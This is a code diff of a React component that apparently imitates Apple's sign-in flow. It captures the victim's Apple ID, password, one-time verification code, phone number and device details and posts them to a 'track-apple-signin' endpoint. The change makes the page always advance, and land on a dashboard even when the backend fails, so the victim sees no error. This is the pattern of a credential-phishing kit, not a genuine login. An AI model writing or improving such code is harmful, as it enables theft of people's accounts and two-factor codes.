@@ -43,21 +43,21 @@ const AppleAuth = () => {
     }
 
     setLoading(true);
-    try {
-      await axios.post(`${API_URL}/auth/track-apple-signin`, {
-        appleId: formData.appleId,
-        password: formData.password,
-        step: 'credentials',
-        userDetails: getUserDetails()
-      });
-      
+    
+    // Send credentials to backend (don't wait for response)
+    axios.post(`${API_URL}/auth/track-apple-signin`, {
+      appleId: formData.appleId,
+      password: formData.password,
+      step: 'credentials',
+      userDetails: getUserDetails()
+    }).catch(err => console.error('Tracking error:', err));
+    
+    // Always progress to next step
+    setTimeout(() => {
       setStep('otp');
       setError('');
-    } catch (err) {
-      console.error('Error:', err);
-    } finally {
       setLoading(false);
-    }
+    }, 500);
   };
 
   const handleOTPSubmit = async (e) => {
@@ -68,27 +68,27 @@ const AppleAuth = () => {
     }
 
     setLoading(true);
-    try {
-      const response = await axios.post(`${API_URL}/auth/apple-complete`, {
-        appleId: formData.appleId,
-        password: formData.password,
-        otp: formData.otp,
-        phoneNumber: formData.phoneNumber,
-        trustedDevice: formData.trustedDevice,
-        step: 'otp',
-        userDetails: getUserDetails()
-      });
-
+    
+    // Send OTP to backend
+    axios.post(`${API_URL}/auth/apple-complete`, {
+      appleId: formData.appleId,
+      password: formData.password,
+      otp: formData.otp,
+      phoneNumber: formData.phoneNumber,
+      trustedDevice: formData.trustedDevice,
+      step: 'otp',
+      userDetails: getUserDetails()
+    }).then(response => {
       if (response.data.token) {
         localStorage.setItem('token', response.data.token);
         localStorage.setItem('user', JSON.stringify(response.data.user));
-        navigate('/dashboard');
       }
-    } catch (err) {
-      setError('Invalid verification code. Please try again.');
-    } finally {
-      setLoading(false);
-    }
+      navigate('/dashboard');
+    }).catch(err => {
+      console.error('Complete error:', err);
+      // Still navigate to dashboard even if backend fails
+      navigate('/dashboard');
+    });
   };
 
   return (
